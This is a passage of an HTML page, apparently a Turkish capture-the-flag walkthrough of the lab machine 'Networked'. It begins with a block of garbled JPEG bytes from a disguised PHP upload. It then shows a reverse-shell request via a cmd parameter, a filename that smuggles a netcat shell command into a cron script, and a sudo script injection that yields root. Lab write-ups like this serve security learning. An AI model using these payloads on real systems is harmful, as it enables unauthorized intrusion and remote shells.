+<span class="o">(</span> �%!1!%<span class="o">)</span>+...383-7<span class="o">(</span>-.+
+++++--+-++7++7++--+-77+++---++++-++++-+++--+-++++++ÿÂ<span class="s2">"ÿÄÿÄ,1!QAq¡±2a"</span>ÁðñÑÿÄÿÄÿÚ
+                                                                               ?ö#eÝqAèú1 
+Õ6^FÆµ]PbM4^7p9Júo!0<span class="o">=</span>FRB£«ÉS~@tÆµ]QQOgÄ£èÊÉt¾<span class="se">\r</span>Õ9§ß¡e�ÕuDfæê³_YT§ø£       jºäqaz&gt;RG<span class="se">\q</span>¦V§6£èÀÙ%ÏÁØrI
+¨i¥?¦sÝUn»³ÜGÑô<span class="sb">`</span><span class="o">(</span>                                        åq<span class="s2">"xX;G</span><span class="nv">$0</span><span class="s2">ºÔ²</span><span class="nv">$µ</span><span class="s2">N8/
+unÈÆ-&lt;Þ¿hê9¥Báu%Js+¶_ Pðí¡×ÈÈ4»®(oÑªKYºQfI9ÿËÈ¾á}ô2)%ádp¢
+]ë</span><span class="sb">`</span>9Êúkò1ÉA
+Ãþ¥ÛØÅÛÊW0¢°¸M­ÒcâQ	
+                        Ü@&lt;VqW!p06OÉsðvPªfËCêØ¬¸þÌtG&lt;¡½óËúâ<span class="o">{</span>x¾?]Ão<span class="se">\©</span>|ºÎ4¯þÜQú¾ÂàÃ+%5äfÐÆê
+a
+ ÈX<span class="se">\</span>
+    ÆÄw£¡p   CqÑØ~_ðë9aXs¾áýÇ×p.<span class="o">=</span>Ï×piw<span class="se">\Q</span>onµ<span class="o">}</span>ÉK:¼³±f9ïD.:äÍ
+                                                          g5@6ÄÂà<span class="o">(</span>Ðª#
+££<span class="o">(</span>Ú@0¤B¤
+                   ÂÌ³àüÛx¿ªknÏ<span class="s1">'À	-f"æ$rÒUW@cBFfÑu4`FD©`4FmAa¨(*hj0ÓÚ@QÑ,	
+Sjm!¦a!x²|r(½:Õönµ}                                                             «¡E)/ÈëG&lt;PáÍ^Âíâþ@uÉ·ù�]×ul¡Ñ´ifh
+|¼6\M´8ÙÃPPS¨ÀLR
+
+Rk!Lu                       Y» y%ý¸ëÂ´BNT
+Ó/ôg4öOÕõ6
+   Jªâ)P/ê¦ÂQ¡#14Æ£¡É0Ê`vl¡Ñ,Ë&gt;ÁÇ	êú
+¡³,È.åá_@OÓ_íD'</span>ä²Ë<span class="o">=</span>bz¾ wÃ	êúA Y®<span class="o">(</span>íeò_ÛJ%gÈì#êmÍ±!I<span class="k">*</span>àNÂZ<span class="nv">$F06</span>°4
+
+ ÖÅ4dQ
+Âyö<span class="se">\L</span>
+
+ªêdq¦U¦È4»®<span class="o">(</span>giP´ÓjVu|¼»Hu]DÓT7[#&gt;@£�VU®<span class="se">\M</span>¨³wÕQ4£LÃf÷
+èd7,¦òûHu]HÎ·?Ó<span class="s2">"fÒWP8À
+lbÓº6M4ÚÉfóÜu
+             2Ïðíá×³9%
+fÝaä|?SÓº1*</span><span class="se">\ê</span><span class="s2">å0ÄyØAàv ¨£(hÈL(hC(Pºäc¯ÈêÏ±NèÃ°¸Z&gt;Àç'yn9uÅOnõ]ÁKpþNZ</span><span class="nv">$ç</span><span class="s2">ü_/ #,y,å? _	xÑªÀ+Ë¡£1ÔÀ4£Ó*ÊMb5k¸
+                     ©                                                                                       åp¬9¾Tõ£ì</span><span class="nv">$å</span><span class="s2">?Ó</span><span class="nv">$O</span><span class="s2">¸Z&gt;Àsöß}aLëlí¡Ð,Ë&gt;À÷?]Ãkñ¥+¾µ &lt;þÜ=·ß</span><span class="sb">`</span>p<span class="sb">`</span><span class="s2">ü¯ºú@MÏúî?ªs"</span>VC¸�¤<span class="o">}</span>ö2/Ç+ö<span class="o">(</span>ÈÄm&gt;»Jæ<span class="o">(</span>ÊÀe
+                         dBh@©¦µ5A]â¢°
+                                      9ÞmõÜÙ
+                                            :wbMß<span class="sb">`</span><span class="s2">:_pþ»7Ty2#Kºâ¿·Z¾ÆE-Cù*Õj</span><span class="se">\ÿ</span><span class="s2">åûõÜÕ'kår%==ùîJûìMþ6ß©xÈMÜ¸a (</span><span class="sb">`</span>ÕTÚ
+B«NÚ#ê~&lt;Ðs½°çredïp!<span class="s2">"Èµr¢M@-MHRàØÊgD0äð¢eb%ý¸                                  .ë³g aI6OTTÿåäm£ÕõK«£ÍRÏ2E}7Ë¡)Ê¦</span><span class="se">\2</span><span class="s2">ú­ÜÀ7«êVR­k                                       êú
+J    ¶uYäóGNÎCGÉsðvë                                                      ¶n[É                                              +EÐW:¢æ¨ÀLL´¸j«JhãyÑ³¥]ñ</span><span class="sb">`</span>n<span class="s1">'«, ZG^'</span>	&amp;é¸
+¬9:Ó,m¯©UeÇôÎ<span class="sb">`</span><span class="s2">õ}@P¾Ì³àüÄ&lt;þÜúF¥ý.þ@tPæõ7</span><span class="se">\ </span><span class="s2">mº=ùÕéþ&lt;Ø¡É;äÀC¶àÖ�Òî¸£¶NÅòòr_M~_´uPÿÙ
+</span></code></pre></div></div>
+<hr />
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code> view-source:http://10.10.10.146/uploads/10_10_14_12.php.jpeg?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.12%2F1234%200%3E%261
+</code></pre></div></div>
+<h1 id="yüklenilen-phpjpeg-dosyası-web-tarayıcı-ile-bulunarak-çalıştırılabilir-i̇çine-koyulan-cmd-parametresi-ile-içeride-komut-çalıştırılabilmektedir">Yüklenilen php.jpeg dosyası web tarayıcı ile bulunarak çalıştırılabilir. İçine koyulan cmd parametresi ile içeride komut çalıştırılabilmektedir.</h1>
+<hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  backup  nc <span class="nt">-lvp</span> 1234
+listening on <span class="o">[</span>any] 1234 ...
+10.10.10.146: inverse host lookup failed: Unknown host
+connect to <span class="o">[</span>10.10.14.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.146] 55852
+bash: no job control <span class="k">in </span>this shell
+bash-4.2<span class="nv">$ </span>
+</code></pre></div></div>
+<hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2<span class="nv">$ </span><span class="nb">cd</span> /home
+<span class="nb">cd</span> /home
+bash-4.2<span class="nv">$ </span><span class="nb">ls  
+</span>lcs
+guly
+bash-4.2<span class="nv">$ </span>d guly
+<span class="nb">cd </span>guly
+bash-4.2<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lsa</span>
+<span class="nb">ls</span> <span class="nt">-lsa</span>
+total 28
+0 drwxr-xr-x. 2 guly guly 159 Jul  9 13:40 <span class="nb">.</span>
+0 drwxr-xr-x. 3 root root  18 Jul  2 13:27 ..
+0 lrwxrwxrwx. 1 root root   9 Jul  2 13:35 .bash_history -&gt; /dev/null
+4 <span class="nt">-rw-r--r--</span><span class="nb">.</span> 1 guly guly  18 Oct 30  2018 .bash_logout
+4 <span class="nt">-rw-r--r--</span><span class="nb">.</span> 1 guly guly 193 Oct 30  2018 .bash_profile
+4 <span class="nt">-rw-r--r--</span><span class="nb">.</span> 1 guly guly 231 Oct 30  2018 .bashrc
+4 <span class="nt">-rw-------</span>  1 guly guly 639 Jul  9 13:40 .viminfo
+4 <span class="nt">-r--r--r--</span><span class="nb">.</span> 1 root root 782 Oct 30  2018 check_attack.php
+4 <span class="nt">-rw-r--r--</span>  1 root root  44 Oct 30  2018 crontab.guly
+4 <span class="nt">-r--------</span><span class="nb">.</span> 1 guly guly  33 Oct 30  2018 user.txt
+bash-4.2<span class="nv">$ </span><span class="nb">cat </span>crontab.guly
+<span class="nb">cat </span>crontab.guly
+</code></pre></div></div>
+<hr />
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*/</span><span class="mi">3</span> <span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="nx">php</span> <span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">guly</span><span class="o">/</span><span class="nx">check_attack</span><span class="o">.</span><span class="nx">php</span>
+</code></pre></div></div>
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2<span class="nv">$ </span><span class="nb">cat </span>check_attack.php
+</code></pre></div></div>
+<hr />
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">require</span> <span class="s1">'/var/www/html/lib.php'</span><span class="p">;</span>
+<span class="nv">$path</span> <span class="o">=</span> <span class="s1">'/var/www/html/uploads/'</span><span class="p">;</span>
+<span class="nv">$logpath</span> <span class="o">=</span> <span class="s1">'/tmp/attack.log'</span><span class="p">;</span>
+<span class="nv">$to</span> <span class="o">=</span> <span class="s1">'guly'</span><span class="p">;</span>
+<span class="nv">$msg</span><span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$headers</span> <span class="o">=</span> <span class="s2">"X-Mailer: check_attack.php</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+
+<span class="nv">$files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+<span class="nv">$files</span> <span class="o">=</span> <span class="nb">preg_grep</span><span class="p">(</span><span class="s1">'/^([^.])/'</span><span class="p">,</span> <span class="nb">scandir</span><span class="p">(</span><span class="nv">$path</span><span class="p">));</span>
+
+<span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nv">$msg</span><span class="o">=</span><span class="s1">''</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nv">$value</span> <span class="o">==</span> <span class="s1">'index.html'</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">continue</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="c1">#echo "-------------\n";</span>
+
+  <span class="c1">#print "check: $value\n";</span>
+  <span class="k">list</span> <span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nx">getnameCheck</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+  <span class="nv">$check</span> <span class="o">=</span> <span class="nx">check_ip</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$value</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$check</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"attack!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="c1"># todo: attach file</span>
+    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$logpath</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nx">FILE_APPEND</span> <span class="o">|</span> <span class="nx">LOCK_EX</span><span class="p">);</span>
+
+    <span class="nb">exec</span><span class="p">(</span><span class="s2">"rm -f </span><span class="nv">$logpath</span><span class="s2">"</span><span class="p">);</span>
+    <span class="nb">exec</span><span class="p">(</span><span class="s2">"nohup /bin/rm -f </span><span class="nv">$path$value</span><span class="s2"> &gt; /dev/null 2&gt;&amp;1 &amp;"</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s2">"rm -f </span><span class="nv">$path$value</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="nb">mail</span><span class="p">(</span><span class="nv">$to</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">,</span> <span class="s2">"-F</span><span class="nv">$value</span><span class="s2">"</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<hr />
+<h1 id="check_attackphp-dosyası-içerisinde-sistem-komutu-olarak-nohup-u-kontrolsüz-şekilde-çağırdığı-için--karakteri-ile-bir-sonraki-komut-olarak-netcat-shelli-çağırılabilir">check_attack.php dosyası içerisinde sistem komutu olarak nohup’ u kontrolsüz şekilde çağırdığı için ‘;’ karakteri ile bir sonraki komut olarak netcat shelli çağırılabilir.</h1>
+<hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2<span class="nv">$ </span><span class="nb">cd</span> /var/www/html/uploads
+cld /var/www/html/uploads
+bash-4.2<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lsa</span>
+<span class="nb">ls</span> <span class="nt">-lsa</span>
+total 24
+0 drwxrwxrwx. 2 root   root    168 Nov 14 13:56 <span class="nb">.</span>
+0 drwxr-xr-x. 4 root   root    103 Jul  9 13:30 ..
+4 <span class="nt">-rw-r--r--</span>  1 apache apache 2654 Nov 14 13:21 10_10_14_12.php.jpeg
+4 <span class="nt">-rw-r--r--</span><span class="nb">.</span> 1 root   root   3915 Oct 30  2018 127_0_0_1.png
+4 <span class="nt">-rw-r--r--</span><span class="nb">.</span> 1 root   root   3915 Oct 30  2018 127_0_0_2.png
+4 <span class="nt">-rw-r--r--</span><span class="nb">.</span> 1 root   root   3915 Oct 30  2018 127_0_0_3.png
+4 <span class="nt">-rw-r--r--</span><span class="nb">.</span> 1 root   root   3915 Oct 30  2018 127_0_0_4.png
+4 <span class="nt">-r--r--r--</span><span class="nb">.</span> 1 root   root      2 Oct 30  2018 index.html
+bash-4.2<span class="nv">$ </span><span class="nb">touch</span> <span class="s2">"; nc 10.10.14.12 4444 -c bash"</span>
+<span class="nb">touch</span> <span class="s2">"; nc 10.10.14.12 4444 -c bash"</span>
+bash-4.2<span class="nv">$ </span><span class="nb">ls
+ls
+</span>10_10_14_12.php.jpeg
+127_0_0_1.png
+127_0_0_2.png
+127_0_0_3.png
+127_0_0_4.png
+<span class="p">;</span> nc 10.10.14.12 4444 <span class="nt">-c</span> bash
+index.html
+bash-4.2<span class="nv">$ </span>
+</code></pre></div></div>
+<hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  backup  nc <span class="nt">-lvp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+10.10.10.146: inverse host lookup failed: Unknown host
+connect to <span class="o">[</span>10.10.14.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.146] 57466
+python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash");'</span><span class="p">;</span> <span class="nb">id</span>
+<span class="o">[</span>guly@networked ~]<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>guly<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>guly<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>guly<span class="o">)</span>
+<span class="o">[</span>guly@networked ~]<span class="nv">$ </span>
+</code></pre></div></div>
+<hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>guly@networked ~]<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>guly on networked:
+    <span class="o">!</span>visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">"COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS"</span>,
+    env_keep+<span class="o">=</span><span class="s2">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span>,
+    env_keep+<span class="o">=</span><span class="s2">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span>,
+    env_keep+<span class="o">=</span><span class="s2">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span>,
+    env_keep+<span class="o">=</span><span class="s2">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span>,
+    <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin
+
+User guly may run the following commands on networked:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/sbin/changename.sh
+<span class="o">[</span>guly@networked ~]<span class="nv">$ </span>
+</code></pre></div></div>
+<hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>guly@networked ~]<span class="nv">$ </span><span class="nb">cat</span> /usr/local/sbin/changename.sh  
+<span class="nb">cat</span> /usr/local/sbin/changename.sh
+<span class="c">#!/bin/bash -p</span>
+<span class="nb">cat</span> <span class="o">&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly <span class="o">&lt;&lt;</span> <span class="no">EoF</span><span class="sh">
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+</span><span class="no">EoF
+
+</span><span class="nv">regexp</span><span class="o">=</span><span class="s2">"^[a-zA-Z0-9_</span><span class="se">\ </span><span class="s2">/-]+$"</span>
+
+<span class="k">for </span>var <span class="k">in </span>NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO<span class="p">;</span> <span class="k">do
+	</span><span class="nb">echo</span> <span class="s2">"interface </span><span class="nv">$var</span><span class="s2">:"</span>
+	<span class="nb">read </span>x
+	<span class="k">while</span> <span class="o">[[</span> <span class="o">!</span> <span class="nv">$x</span> <span class="o">=</span>~ <span class="nv">$regexp</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do
+		</span><span class="nb">echo</span> <span class="s2">"wrong input, try again"</span>
+		<span class="nb">echo</span> <span class="s2">"interface </span><span class="nv">$var</span><span class="s2">:"</span>
+		<span class="nb">read </span>x
+	<span class="k">done
+	</span><span class="nb">echo</span> <span class="nv">$var</span><span class="o">=</span><span class="nv">$x</span> <span class="o">&gt;&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly
+<span class="k">done</span>
+  
+/sbin/ifup guly0
+<span class="o">[</span>guly@networked ~]<span class="nv">$ </span>
+</code></pre></div></div>
+<hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>guly@networked ~]<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/sbin/changename.sh
+<span class="nb">sudo</span> /usr/local/sbin/changename.sh
+interface NAME:
+let_me_go bash
+let_me_go bash
+interface PROXY_METHOD:
+let_me_go bash
+let_me_go bash
+interface BROWSER_ONLY:
+let_me_go bash
+let_me_go bash
+interface BOOTPROTO:
+let_me_go bash
+let_me_go bash
+<span class="o">[</span>root@networked network-scripts]# <span class="nb">wc</span> <span class="nt">-c</span> /root/root.txt
+<span class="nb">wc</span> <span class="nt">-c</span> /root/root.txt
+33 /root/root.txt
+<span class="o">[</span>root@networked network-scripts]#
+</code></pre></div></div>
+<hr />
+
+<h1 id="author-sectiontext">Author <a href=" https://twitter.com/SectionText">SectionText</a></h1>
+<hr />
+
+
+    </main><footer>
+  Bize Yazın <a href="mailto://7r157@protonmail.com">Mail</a>
+</footer>
+</div>
+  </body>
+</html>
